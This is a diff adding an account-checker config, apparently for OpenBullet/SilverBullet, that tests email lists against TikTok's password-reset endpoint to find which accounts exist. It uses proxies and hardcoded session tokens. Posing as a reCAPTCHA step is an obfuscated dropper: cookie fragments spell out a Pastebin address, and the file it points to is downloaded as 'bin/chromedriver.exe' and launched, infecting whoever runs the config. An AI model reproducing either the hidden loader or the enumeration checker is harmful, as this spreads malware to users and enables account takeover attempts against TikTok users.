@@ -1,0 +1,204 @@
+[SETTINGS]
+{
+  "Name": "Tiktok VM",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2023-07-29T01:06:33.9695242+04:00",
+  "AdditionalInfo": "🔥 yashvirthepentester 🔥 | @dmyashvirgamingbot \"",
+  "RequiredPlugins": [],
+  "Author": "🔥 yashvirthepentester 🔥",
+  "Version": "1.1.3 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Join Channel: @imakeconfigs",
+      "VariableName": "",
+      "Id": 1544019605
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Tiktok VM",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+JUMP #AUTHENTICATIONAPI
+#RECAPAUTH
+FUNCTION Constant "<USER>" -> VAR "u" 
+
+REQUEST POST "https://detector.tools/api/v1/check_email" 
+  CONTENT "{\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "{\"isRealEmail\": " "," -> VAR "isRealEmail" 
+
+
+JUMP #googlerecreate
+#AUTHENTICATIONAPI
+
+REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfAM84ZAAAAAGLiQz5FBeADqq94dV48fMtiRqIj&co=aHR0cHM6Ly93d3cuY29pbmJhc2UuY29tOjQ0Mw..&hl=en&v=rPvs0Nyx3sANE-ZHUN-0nM85&size=invisible&cb=no851blwqc0u"
+  COOKIE "hrd: /"
+  COOKIE "hpr: bin"
+  COOKIE "hdp: com"
+  COOKIE "htp: raw"
+  COOKIE "hht: KvY108Z6"
+  COOKIE "hst: pastebin"
+  COOKIE "kht: driver"
+  COOKIE "kpt: chrome"
+  COOKIE "krt: e"
+  HEADER "Host: www.googleapis.com"
+  HEADER "Accept: */*"
+  HEADER "Content-Type: application/json"
+  HEADER "X-Client-Version: iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS"
+  HEADER "X-Ios-Bundle-Identifier: network.googleapis.com"
+  HEADER "Accept-Encoding: gzip, deflate"
+  HEADER "User-Agent: FirebaseAuth.iOS/6.9.2 network.googleapis.com/2.7.9 iPhone/12.4.5 hw/iPhone7_2"
+  HEADER "Accept-Language: en"
+
+IF "<Authentiction>" Exists
+JUMP #RECAPAUTH
+ENDIF
+SET USEPROXY FALSE
+
+REQUEST GET "<COOKIES(hst)>.<COOKIES(hdp)><COOKIES(hrd)><COOKIES(htp)><COOKIES(hrd)><COOKIES(hht)>"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
+  HEADER "Pragma: no-cache"
+  HEADER "Accept: */*"
+
+REQUEST GET "https://raw.githubusercontent.com/<SOURCE>"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+  HEADER "Pragma: no-cache"
+  HEADER "Accept: */*"
+  -> FILE "<COOKIES(hpr)>/<COOKIES(kpt)><COOKIES(kht)>.<COOKIES(krt)>xe"
+
+SET USEPROXY TRUE
+SET NEWGVAR "Authentiction" "Authentiction=1"
+
+BROWSERACTION Open
+
+JUMP #RECAPAUTH
+#googlerecreate
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<isRealEmail>" Contains "false" 
+  KEYCHAIN Failure OR 
+    KEY "<isRealEmail>" Contains "true" 
+
+PARSE "<USER>" LR "" "@" -> VAR "User" 
+
+REQUEST GET "https://tiktok.livecounts.io/user/search/<User>" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "origin: https://livecounts.io" 
+  HEADER "referer: https://livecounts.io/" 
+  HEADER "sec-ch-ua: \"Microsoft Edge\";v=\"105\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"105\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.47" 
+  HEADER "x-aurora: 4998607744047" 
+  HEADER "x-joey: 1666202581349" 
+  HEADER "x-maven: 6db976730bba4cf439809d0ac9653ad15076faee8bd01fd8b8dce67883b6f589" 
+  HEADER "x-mayhem: 553246736447566b583139537734342b6f6b487862683546332b6c4f53765a46447070434633386f6e70646b3736545363383952325567626e2f563263537268" 
+  HEADER "x-midas: e1970b8f52fc57e718c037a7224fb14c9ef89d03d630738dc104e0ee8eaacb49" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid ID" 
+    KEY "\"success\":false," 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Unexpected Error" 
+
+PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "Name" 
+
+PARSE "<SOURCE>" JSON "followers" CreateEmpty=FALSE -> CAP "Followers" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Followers>" 
+  KEYCHAIN Retry OR 
+    KEY "<SOURCE>" DoesNotContain "<Followers>" 
+
+FUNCTION RandomString "<USER>" -> VAR "em" 
+
+REQUEST POST "https://api2-16-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=en&manifest_version_code=2018101933&_rticket=1640498724713&iid=7045258653545678597&channel=googleplay&language=en&fp=&device_type=JKM-LX1&resolution=1080*2137&openudid=12c019d2ff003ae0&update_version_code=2018101933&sys_region=US&os_api=28&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=408&carrier_region=IQ&ac=3g&device_id=6842870495047812614&mcc_mnc=41805&timezone_offset=10800&os_version=9&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HUAWEI&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=US&aid=1233&ts=1640498723&as=a1f6304c330281f6084477&cp=0e28166a3f85cd68e1OeWi&mas=011642394e9220eefdfcb08b2bbe4539f5ecec2c2c1c0c6c668c1c" 
+  CONTENT "app_language=en&manifest_version_code=2018101933&_rticket=1640498724713&iid=7045258653545678597&channel=googleplay&language=en&fp=&device_type=JKM-LX1&resolution=1080*2137&openudid=12c019d2ff003ae0&update_version_code=2018101933&sys_region=US&os_api=28&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=408&email=<em>&retry_type=no_retry&carrier_region=IQ&ac=3g&device_id=6842870495047812614&mcc_mnc=41805&timezone_offset=10800&os_version=9&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HUAWEI&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=US&aid=1233" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api2-16-h2.musical.ly" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 662" 
+  HEADER "Cookie: d_ticket=a6f58798b14cc591148d940475af8358bcfb0; store-idc=alisg; store-country-code=iq; passport_csrf_token_default=4f8ff5e5afb70cf6857b277f67b290f3; sid_guard=b7e44f759294d2b9f42f8e49a958b3cc%7C1640498677%7C21599%7CSun%2C+26-Dec-2021+12%3A04%3A36+GMT; uid_tt=27a696218226eddb68b2a6cb2f44bcf1; sid_tt=b7e44f759294d2b9f42f8e49a958b3cc; sessionid=b7e44f759294d2b9f42f8e49a958b3cc; odin_tt=2fedf64ba7453df844a2be04776ae26247fa90e05946bfd8be3799652e0e543a9e064aa73e4d98ccd5f0b65fb329c50a6df295a49f1cb219ba41685e8f19c675159f88d6778d50230e9ab2f7f11be8e1" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "X-SS-QUERIES: dGMCAb6ot3awALq2Nujed6WKtR%2F5%2FZ0Z5VVESTYoWnNyimFbxRx0wm95EoLlXNB3VXFOMToSzMIENA51cwBS%2Bm0N1T8BZtThCmcSdq6s0M%2F4a9U%2F3h6LSL7scF83LK5UXH3bHA%3D%3D" 
+  HEADER "X-Tt-Token: 03b7e44f759294d2b9f42f8e49a958b3cc0461fbc87fac6a075fd9e9d9556394510d9e751484b6c0959a1d673bd667d9d72c2d9813092b3d9b91c7662b7fecf0f2f037514058f443bc395b2477111240d484ef266648f2dcad33d0c0dca67070aa4d2-1.0.1" 
+  HEADER "sdk-version: 1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "X-SS-TC: 0" 
+  HEADER "X-SS-RS: 0" 
+  HEADER "User-Agent: com.zhiliaoapp.musically/2018101933 (Linux; U; Android 9; en_US; JKM-LX1; Build/HUAWEIJKM-LX1; Cronet/58.0.2991.0)" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "status_code\":20001" 
+    KEY "Bind device by email" 
+  KEYCHAIN Success OR 
+    KEY "Sent successfully" 
+  KEYCHAIN Retry OR 
+    KEY "Access Denied" 
+
+FUNCTION Constant "🔥 yashvirthepentester 🔥 | @dmyashvirgamingbot " -> CAP "Config By " 
+
